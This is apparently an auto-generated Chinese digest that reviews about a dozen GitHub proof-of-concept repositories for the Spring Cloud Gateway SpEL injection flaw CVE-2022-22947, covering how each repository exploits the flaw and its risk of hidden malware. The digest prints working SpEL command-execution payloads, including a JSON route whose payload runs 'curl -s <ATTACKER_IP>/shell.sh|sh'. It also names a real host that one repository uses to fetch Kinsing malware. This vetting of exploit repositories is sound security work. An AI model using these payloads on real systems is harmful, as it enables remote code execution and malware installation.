1.  **前提条件：** Spring Cloud Gateway 实例必须启用并暴露 Actuator 端点，且未进行安全保护。
2.  **添加路由：** 攻击者发送 POST 请求到 `/actuator/gateway/routes/{id}`，其中 `{id}` 是一个自定义的路由 ID。请求体包含一个 JSON 对象，该对象定义了路由的 predicates 和 filters。其中，filters 包含一个 AddResponseHeader filter，其 `value` 属性包含一个 SpEL 表达式，该表达式将执行任意命令。
3.  **刷新路由：** 攻击者发送 POST 请求到 `/actuator/gateway/refresh` 以刷新路由缓存。这将导致 Spring Cloud Gateway 重新加载路由配置，并解析和执行 SpEL 表达式。
4.  **代码执行：** SpEL 表达式执行任意代码，从而允许攻击者控制受影响的系统。

**项目地址:** [Enokiy/cve-2022-22947-spring-cloud-gateway](https://github.com/Enokiy/cve-2022-22947-spring-cloud-gateway)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #5

**来源**: [CVE-2022-22947-LY613313_CVE-2022-22947.md](../2022/CVE-2022-22947-LY613313_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator endpoint 启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入，执行任意代码。利用方式是发送包含恶意SpEL表达式的POST请求到/actuator/gateway/routes端点，然后刷新路由，触发SpEL表达式的执行，从而实现远程代码执行。

**有效性评估：**
根据漏洞信息和POC代码，此POC代码是有效的。漏洞库信息明确指出该漏洞允许远程代码执行，搜索引擎结果也确认了这一点，并且提供了公开的漏洞利用代码。

**投毒风险评估：**
代码本身看起来是标准的漏洞利用代码，用于利用 CVE-2022-22947 漏洞。其中一个潜在的风险点在于 `commond` 变量，该变量从用户输入获取，然后拼接到 SpEL 表达式中。如果用户输入恶意或过长的命令，可能会导致目标系统崩溃或执行意外操作。但是，这不属于作者投毒的范畴。`base64cmd` 函数将用户输入的命令进行 Base64 编码，这本身并非恶意行为，但如果用户输入的命令本身就具有破坏性，Base64 编码只是对其进行了编码，并没有改变其本质。总体来看，该 POC 代码的投毒风险较低，约为 10%。主要的风险在于用户输入，而非代码本身。

**漏洞利用方式：**
1.  **条件判断：** 确定目标系统运行着受影响的 Spring Cloud Gateway 版本，并且 Gateway Actuator endpoint 处于启用、暴露且未进行安全保护的状态。
2.  **构造恶意请求：** 使用POST请求，构造包含恶意SpEL表达式的JSON数据，发送到`/actuator/gateway/routes`端点。SpEL表达式中包含要执行的系统命令。
3.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，刷新Gateway的路由配置，触发SpEL表达式的执行。
4.  **执行任意代码：** 恶意SpEL表达式被执行，从而在目标系统上执行任意代码，例如反弹shell。
5.  **清理：** 删除添加的路由，再次刷新路由。


**项目地址:** [LY613313/CVE-2022-22947](https://github.com/LY613313/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #6

**来源**: [CVE-2022-22947-Le1a_CVE-2022-22947.md](../2022/CVE-2022-22947-Le1a_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** 需要Gateway Actuator端点启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator端点被启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入执行任意代码。  

**有效性：**
提供的PoC代码有效。代码通过构造包含恶意SpEL表达式的路由配置，利用`/actuator/gateway/routes`端点添加恶意路由，然后通过`/actuator/gateway/refresh`端点刷新路由，触发SpEL表达式执行，从而实现远程代码执行。PoC代码在执行命令后，还会删除创建的恶意路由，并再次刷新路由，以清除痕迹。

**投毒风险：**
该仓库中的PoC代码没有发现明显的投毒代码。PoC代码的功能明确，即利用漏洞执行命令并返回结果。代码主要通过`requests`库发送HTTP请求，并使用`re`库解析命令执行结果。没有任何迹象表明作者在代码中隐藏了恶意逻辑或后门。

**利用方式：**
1.  **目标确认：**  确认目标系统正在运行存在漏洞的Spring Cloud Gateway版本，并且Actuator端点已启用、暴露且未授权访问。
2.  **构造恶意请求：**  攻击者构造一个包含恶意SpEL表达式的JSON payload，发送到`/actuator/gateway/routes/{id}`端点，其中SpEL表达式用于执行任意命令。例如，`#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()))}`
3.  **刷新路由：**  发送一个POST请求到`/actuator/gateway/refresh`端点，强制Gateway刷新路由配置，从而触发SpEL表达式执行。
4.  **获取执行结果：**  发送一个GET请求到`/actuator/gateway/routes/{id}`，获取包含执行结果的响应头。
5.  **清理：** 删除添加的恶意路由，并再次刷新路由。

**项目地址:** [Le1a/CVE-2022-22947](https://github.com/Le1a/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #7

**来源**: [CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md](../2022/CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md)

## CVE-2022-22947 Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意远程代码。该漏洞的利用方式如下：

1.  **漏洞原理：** 漏洞根源在于 SpEL 表达式的错误处理，攻击者可以通过 SpEL 表达式注入恶意代码。
2.  **利用步骤：**
    *   攻击者首先发送包含恶意 SpEL 表达式的请求到 `/actuator/gateway/routes/` 端点，添加一个新的路由，其中 `filter` 使用 `AddResponseHeader` 过滤器，`value` 包含恶意的 SpEL 表达式，SpEL表达式会被base64编码，保证其可以正常传输
    *   然后，攻击者通过访问 `/actuator/gateway/refresh` 端点，强制网关刷新路由配置，从而触发 SpEL 表达式的执行。
    *   最后，攻击者可以通过访问之前创建的路由(`/actuator/gateway/routes/66Sec`)，触发 SpEL 表达式的执行，并将执行结果通过请求返回。
3.  **POC 代码分析：**
    *   `CVE-2022-22947.py` 脚本首先定义了几个关键变量，包括 URL 路径（`payload1`, `payload2`, `payload3`）和请求头（`headers`）。
    *   `data` 变量包含经过 Base64 编码的恶意路由配置信息。该配置信息设置了一个名为 `WeianSec` 的路由，该路由使用 `AddResponseHeader` 过滤器，并将 SpEL 表达式注入到 `value` 属性中。
    *   脚本使用 `requests` 库发送 POST 请求到 `/actuator/gateway/routes/66Sec` 端点，添加恶意路由。
    *   然后，脚本发送 POST 请求到 `/actuator/gateway/refresh` 端点，刷新路由配置。
    *   最后，脚本发送 GET 请求到 `/actuator/gateway/routes/66Sec` 端点，提取执行结果。
    *   脚本中的 cmd变量，允许用户自定义执行的命令，增加了灵活性。
4.  **有效性：** 根据漏洞库信息、搜索结果和提供的 POC 代码，该 POC 代码是有效的，可以实现远程代码执行。
5.  **投毒风险：** 仓库中存在小概率的投毒风险（10%）。风险点在于，虽然主脚本 `CVE-2022-22947.py` 看似直接利用漏洞，但攻击者可以通过修改 `cmd` 变量来执行任意命令，并且README.md文件中提供的图片是经过处理的，不排除作者后期修改代码，添加恶意后门的可能。

**项目地址:** [SecNN/CVE-2022-22947_Rce_Exp](https://github.com/SecNN/CVE-2022-22947_Rce_Exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #8

**来源**: [CVE-2022-22947-SiJiDo_CVE-2022-22947.md](../2022/CVE-2022-22947-SiJiDo_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), and unsupported versions

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。攻击者可以在 Gateway Actuator 端点开启且未进行安全保护的情况下，通过构造恶意请求执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** 该漏洞源于 Spring Cloud Gateway 中 SpEL 表达式的执行，攻击者可以通过 SpEL 表达式注入恶意代码，进而执行任意命令。
2.  **利用条件：**
    *   目标系统使用存在漏洞的 Spring Cloud Gateway 版本。
    *   Gateway Actuator 端点被启用。
    *   Gateway Actuator 端点对外暴露且未进行任何身份验证。
3.  **漏洞利用代码分析：** 提供的Python脚本 (exp.py)首先定义了一个`GMem`类，将编译后的java字节码进行base64解码后赋值给`classbytes`。该Java类主要功能：
    *   通过反射机制定义类 (`ReflectUtils.defineClass`)
    *   执行命令
    *   进行base64编码/解码等操作。
    *   创建了一个包含payload的HashMap，payload被精心构造用于在目标服务器上执行命令。
    脚本通过修改`RequestMappingInfo`的`Builder`并调用`build()`方法触发漏洞，最终导致RCE。
4.  **有效性评估：** 根据漏洞信息和利用代码，该漏洞利用的有效性较高。CISA 将其添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。
5.  **投毒风险评估：** 代码存在一定的投毒风险。虽然脚本主要功能是利用漏洞，但其中嵌入的Java类和SpEL表达式可能包含其他未知的恶意行为。该脚本通过Base64编码隐藏了部分代码，增加了分析难度。该脚本存在投毒风险的可能性为10%, 主要是由于代码混淆和潜在的Java恶意行为。
6.  **利用方式总结：**
    *   攻击者发送恶意构造的 HTTP 请求到 Gateway Actuator 端点。
    *   请求中包含 SpEL 表达式，用于执行任意代码。
    *   Spring Cloud Gateway 在处理请求时，由于没有对 SpEL 表达式进行充分的验证和过滤，导致代码注入。
    *   攻击者通过代码注入执行恶意命令，例如反弹 shell 或执行其他恶意操作。

综上所述，CVE-2022-22947 是一个严重的安全漏洞，攻击者可以利用它在目标系统上执行任意代码，因此需要及时修复。

**项目地址:** [SiJiDo/CVE-2022-22947](https://github.com/SiJiDo/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #9

**来源**: [CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md](../2022/CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator 端点已启用、公开且未受保护。

**POC 可用性:** 是

**投毒风险:** 85%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意的 SpEL 表达式来执行任意代码。 

**有效性：**
根据漏洞信息、搜索结果和提供的 POC 代码，该漏洞利用是有效的。POC 通过向 `/actuator/gateway/routes` 端点发送 POST 请求来创建新的路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。然后刷新路由，并通过访问新创建的路由触发代码执行。最后删除该路由。

**投毒风险：**
提供的 POC 代码存在较高的投毒风险。具体体现在：
1.  **恶意脚本下载和执行：** POC 代码中的 SpEL 表达式尝试从远程服务器（如 `94.103.87.71/scg.sh` ）下载并执行 shell 脚本。 这允许攻击者注入任意恶意代码，例如下载和安装 Kinsing 恶意软件。
2.  **后门植入：** 下载的 shell 脚本可能包含后门代码，允许攻击者在受害者系统上保持持久访问。
3. ** Kinsing恶意软件:** 通过分析shell脚本，发现最终目的是下载并安装 Kinsing 恶意软件

因此，此存储库的投毒风险非常高，约为 85%。使用此POC需要谨慎，务必在隔离环境中进行分析，确保不会对本地环境造成风险。

**利用方式：**
1.  **检查 Actuator 端点：** 确认目标 Spring Cloud Gateway 实例的 Actuator 端点是否启用、公开且未受保护。
2.  **创建恶意路由：** 使用 POST 请求向 `/actuator/gateway/routes` 端点创建一个新的路由。在路由的 `filters` 部分，使用 `AddResponseHeader` 过滤器，并在 `value` 字段中插入包含恶意 SpEL 表达式的代码。 例如:

   ```json
   {
	 "id": "poc",
	 "filters": [{
	   "name": "AddResponseHeader",
	   "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"curl -s <ATTACKER_IP>/shell.sh|sh\"}).getInputStream()))}"}
	   }],
	 "uri": "http://example.com",
	 "order": 0
	}
   ```

3.  **刷新路由：** 使用 POST 请求向 `/actuator/gateway/refresh` 端点发送请求，以刷新所有路由。
4.  **触发代码执行：** 访问新创建的路由，触发 SpEL 表达式的执行。
5.  **清理：** 使用 DELETE 请求向 `/actuator/gateway/routes/{route_id}` 端点删除创建的恶意路由。

**项目地址:** [Sumitpathania03/CVE-2022-22947](https://github.com/Sumitpathania03/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #10

**来源**: [CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md](../2022/CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的代码注入漏洞。根据漏洞描述，当 Gateway Actuator 端点启用、公开且未受到保护时，应用程序容易受到代码注入攻击。攻击者可以发送恶意构造的请求，从而允许在远程主机上执行任意远程代码。

**有效性：**
提供的 POC 代码 `CVE-2022-22947-memshell.py` 看起来是有效的。它利用了 SpEL 表达式注入漏洞，通过构造包含恶意 SpEL 表达式的请求，在目标系统上动态定义一个名为 `SpringRequestMappingMemshell` 的类，实现内存马注入。代码首先对恶意类进行base64编码, 然后通过SpEL表达式解码并加载到JVM中,达到了远程代码执行的效果。

**投毒风险：**
评估 POC 代码是否存在投毒风险。代码的主要功能是利用漏洞注入内存马，实现远程代码执行。其中注入的`SpringRequestMappingMemshell`类需要进一步分析。

通过检查代码，发现注入的类功能是注册一个requestMapping，执行的command命令可以从request参数中获取，具有命令执行功能，但它本身是漏洞利用的一部分，不能算作是作者隐藏的投毒代码。

但考虑到任何远程代码执行漏洞都可能被滥用，因此使用此POC的风险仍然较高。考虑到风险的存在，但不是代码编写者有意为之的恶意添加，评估投毒风险为5%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例的 Actuator 端点必须启用、公开且未受保护。
2.  **漏洞利用：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP 请求，该表达式会被 Gateway Actuator 处理。
3.  **代码注入：** 恶意 SpEL 表达式用于在服务器的内存中定义一个新的 Java 类 (内存马)。
4.  **远程代码执行：** 注入的 Java 类执行攻击者指定的任意代码。

总而言之，此漏洞的利用方式是通过SpEL表达式注入，动态注册一个新的路由，并将处理逻辑绑定到恶意构造的Java类，该类可以接受参数并在服务器上执行任意命令。此过程允许攻击者在目标系统上实现未经授权的远程代码执行。

**项目地址:** [Wrong-pixel/CVE-2022-22947-exp](https://github.com/Wrong-pixel/CVE-2022-22947-exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #11

**来源**: [CVE-2022-22947-Zh0um1_CVE-2022-22947.md](../2022/CVE-2022-22947-Zh0um1_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1+, 3.0.x < 3.0.7+

**利用条件:** Gateway Actuator endpoint 启用、暴露且未做安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Actuator 端点启用且未授权时，攻击者可以通过构造恶意的 SpEL 表达式，利用`Path`路由断言中的 SpEL 注入漏洞执行任意代码。提供的 POC 代码旨在通过动态定义Java类的方式注入哥斯拉内存马。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被证实存在，且有在野利用。提供的 POC 代码实现了利用该漏洞注入哥斯拉内存马，因此该 POC 有效。

**投毒风险分析：**
分析给出的POC代码，主要功能是利用漏洞注入哥斯拉内存马，实现远程代码执行。虽然POC本身是为了利用漏洞，但如果用户直接使用此POC而不了解其行为，可能会被利用来植入恶意后门。

*   代码主要功能：该代码使用Go语言编写，利用 Spring Cloud Gateway 的 SpEL 表达式注入漏洞。它构造一个包含恶意 SpEL 表达式的请求，该表达式用于在目标服务器上动态定义一个 Java 类（哥斯拉内存马），从而实现远程代码执行。
*   投毒可能性：
    *   **高：** 代码直接注入内存马，如果目标系统部署了恶意程序，攻击者也可以构造其他的恶意代码注入到内存中，比如替换关键组件、窃取数据等。
    *   **低：** 由于代码的目的是利用漏洞注入内存马，从这个角度看，本身就是一种攻击行为，很难区分是“正常”利用还是“投毒”。因此，认为该仓库存在一定投毒风险，风险等级较低。

基于以上分析，判定投毒风险为10%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，且未进行安全保护（例如，未进行身份验证）。
2.  **构造恶意请求：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP POST 请求，该表达式利用 `T(org.springframework.cglib.core.ReflectUtils).defineClass` 动态定义一个 Java 类（通常是一个 Webshell 或内存马）。
3.  **利用 Path 路由断言：**  该恶意 SpEL 表达式被嵌入到 Spring Cloud Gateway 的 `Path` 路由断言的参数中。
4.  **发送请求：** 将构造的恶意请求发送到 `/actuator/gateway/routes` 端点。
5.  **代码执行：** Spring Cloud Gateway 在处理路由断言时，会解析并执行 SpEL 表达式，从而在目标服务器上执行攻击者注入的恶意代码。
6.  **内存马驻留：** 注入的哥斯拉内存马会驻留在服务器内存中，允许攻击者通过特定的 HTTP 请求与服务器交互，执行任意命令或上传文件。

**项目地址:** [Zh0um1/CVE-2022-22947](https://github.com/Zh0um1/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #12

**来源**: [CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md](../2022/CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md)

## CVE-2022-22947-Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator endpoint is enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是一个存在于Spring Cloud Gateway中的代码注入漏洞。当Gateway Actuator端点被启用、暴露且未进行安全保护时，远程攻击者可以通过构造恶意请求执行任意代码。漏洞根源在于getValue方法中不安全的SpEL表达式求值。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，且已经有公开的POC。漏洞利用代码是一个Maven项目，旨在重现漏洞。因此，提供的POC代码很可能是有效的。

**投毒风险：**
提供的代码仓库包含一个`README.md`文件和一个`mvnw`脚本。`mvnw` 是 Maven Wrapper 脚本，用于在没有安装 Maven 的情况下构建项目。检查 `mvnw` 脚本，它主要负责下载和启动 Maven，没有发现明显的恶意行为。但是，仍然存在一定的投毒风险，例如：
1.  **依赖项投毒：** 构建项目时使用的 Maven 依赖项可能包含恶意代码。 这种情况发生的概率较低，但存在可能。
2.  **构建脚本投毒：** `pom.xml`文件(未提供)中可能存在恶意插件或目标，在构建过程中执行恶意代码。由于未提供此文件，无法对此进行评估。

考虑到提供的文件主要与Maven构建相关，直接植入后门的难度较高，但通过依赖项投毒的可能性是存在的。因此，投毒风险估计为10%。

**利用方式：**
1.  **确定目标：** 找到运行着存在漏洞的Spring Cloud Gateway实例，并且其Actuator端点对外开放且未进行认证。
2.  **构造恶意请求：** 构造包含恶意SpEL表达式的HTTP请求，发送到Actuator端点。这些SpEL表达式能够执行任意系统命令或代码。
3.  **远程代码执行：**  Spring Cloud Gateway解析并执行恶意SpEL表达式，从而导致远程代码执行。
4.  **控制系统：** 攻击者利用执行的恶意代码控制受害系统。

**优先级：**
根据信息来源的重要性排序：搜索引擎结果 > 漏洞利用代码 > 漏洞库信息

**项目地址:** [aesm1p/CVE-2022-22947-POC-Reproduce](https://github.com/aesm1p/CVE-2022-22947-POC-Reproduce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #13

**来源**: [CVE-2022-22947-anansec_CVE-2022-22947_EXP.md](../2022/CVE-2022-22947-anansec_CVE-2022-22947_EXP.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、公开且未进行安全保护时，攻击者可以通过构造恶意请求，在远程主机上执行任意代码。根据提供的漏洞利用代码，该PoC利用了SpEL表达式注入，通过向`/actuator/gateway/routes/check01`端点发送包含恶意SpEL表达式的POST请求，然后刷新路由并访问该路由，触发SpEL表达式执行。EXP具有单个目标验证、批量验证、反弹shell的功能。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，可以判断该漏洞的PoC代码是有效的。搜索结果中多个链接都表明该漏洞被广泛关注，且存在公开的利用代码。

**投毒风险：**
PoC代码本身主要通过SpEL表达式注入执行命令，没有发现明显的恶意植入行为。但PoC会向目标系统添加路由，并执行命令，存在一定的风险。例如：
*   **资源消耗：** 频繁的路由添加和删除可能导致资源消耗，影响服务性能。
*   **命令执行风险：** 虽然PoC本身是为了验证漏洞，但如果被恶意利用，可能执行恶意命令。
*   **依赖风险：** PoC可能依赖特定的环境或库，如果目标环境不满足要求，可能导致利用失败或产生其他问题。
PoC代码中存在投毒代码的可能性较低，大约10%。这个百分比是基于代码的分析以及PoC作者的动机推断得出的。

**利用方式：**
1.  **前提条件：** Spring Cloud Gateway的Actuator端点已启用、公开且未进行安全保护。
2.  **发送恶意请求：** 构造包含恶意SpEL表达式的JSON数据，并将其作为POST请求发送到`/actuator/gateway/routes/check01`端点。
3.  **刷新路由：** 向`/actuator/gateway/refresh`端点发送POST请求，刷新路由，使新增的路由生效。
4.  **触发表达式执行：** 访问新增的路由，触发SpEL表达式执行，从而执行任意代码。
5.  **清理路由：** 删除新增的路由，避免留下后门。（PoC代码中包含删除路由的步骤）

**项目地址:** [anansec/CVE-2022-22947_EXP](https://github.com/anansec/CVE-2022-22947_EXP)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #14

**来源**: [CVE-2022-22947-cc3305_CVE-2022-22947.md](../2022/CVE-2022-22947-cc3305_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。漏洞的根源在于`getValue`方法中不安全的SpEL表达式评估。利用过程为：

1.  攻击者构造包含恶意SpEL表达式的payload，该表达式可以执行任意命令。
2.  攻击者通过POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是一个攻击者自定义的路由ID。
3.  Spring Cloud Gateway解析payload中的SpEL表达式，导致远程代码执行。
4.  攻击者可以通过`/actuator/gateway/refresh`端点刷新路由配置，使payload生效。

该POC代码通过向 `/actuator/gateway/routes/cc3305` 发送包含恶意SpEL表达式的JSON payload来利用此漏洞，SpEL表达式通过java.lang.Runtime执行任意命令。 代码首先检查目标是否易受攻击（虽然目前返回True）。然后，它准备要执行的命令，并将其嵌入到SpEL表达式中，该表达式会被注入到路由定义中。

关于投毒风险，该脚本主要功能是利用漏洞执行命令。 潜在的投毒风险在于，攻击者可能会修改脚本，使其在执行命令之前或之后执行其他恶意操作，例如下载和执行恶意软件。 但是，提供的代码没有明显的投毒迹象。 投毒的概率较低，大约为1%。 恶意行为者可能会分发修改后的版本。

**有效性评估:**根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞利用是有效的，前提是满足漏洞利用条件。该PoC代码能够成功利用漏洞执行任意命令。


**项目地址:** [cc3305/CVE-2022-22947](https://github.com/cc3305/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #15

**来源**: [CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md](../2022/CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md)

## CVE-2022-22947 Spring Cloud Gateway RCE

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞，当Gateway Actuator端点启用、暴露且未进行安全保护时，攻击者可以利用SpEL表达式注入执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，此漏洞是有效的。多个来源都证实了该漏洞的存在以及远程代码执行的可能性。提供的POC代码可以直接利用该漏洞。

**投毒风险：**

分析提供的POC代码，发现主要的恶意代码在于 `spring-cloud-gateway-rce.py` 中构建和发送的payload。该payload利用SpEL表达式在目标系统上执行任意命令。虽然POC本身是为了演示漏洞利用，但在实际场景中，攻击者可能会修改 `-c` 参数来执行恶意操作。`requirements.txt` 文件声明了项目所需的依赖项（colorama, requests, urllib3），这些库本身没有已知的恶意行为，但如果项目被篡改，可能会引入恶意依赖。

评估投毒风险时，主要考虑以下因素：

*   **代码可读性：** 代码相对简单，易于理解，这意味着潜在的恶意修改也更容易被发现。
*   **外部依赖：** 项目依赖外部库，如果这些库的源被攻破，可能会引入恶意代码。
*   **Payload生成：** Payload是动态生成的，如果攻击者能够控制Payload生成过程，就可以注入恶意代码。

综合来看，此仓库存在一定的投毒风险，风险值评估为10%。主要的风险点在于攻击者可能会修改Payload生成逻辑或引入恶意的依赖项，利用使用者执行恶意代码。

**利用方式：**

1.  **漏洞触发前提：** Spring Cloud Gateway的Actuator端点必须启用、暴露并且没有进行安全保护（例如，没有进行身份验证）。
2.  **构造Payload：** POC代码根据目标主机的操作系统（Linux或Windows）构造包含SpEL表达式的JSON payload。该payload利用`AddResponseHeader`过滤器，将执行命令的结果添加到响应头中。
3.  **发送Payload：** 使用POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是路由的ID（在POC中为`k`）。
4.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，强制Spring Cloud Gateway刷新路由配置，从而触发SpEL表达式的执行。
5.  **获取结果：** 发送GET请求到`/actuator/gateway/routes/{id}`端点，获取路由信息，其中包含命令执行的结果。
6.  **删除路由：** 发送DELETE请求到`/actuator/gateway/routes/{id}`端点，删除添加的路由。

简而言之，攻击者通过构造包含恶意SpEL表达式的请求，利用Actuator端点动态注册路由，并在路由刷新时触发SpEL表达式执行，从而实现远程代码执行。

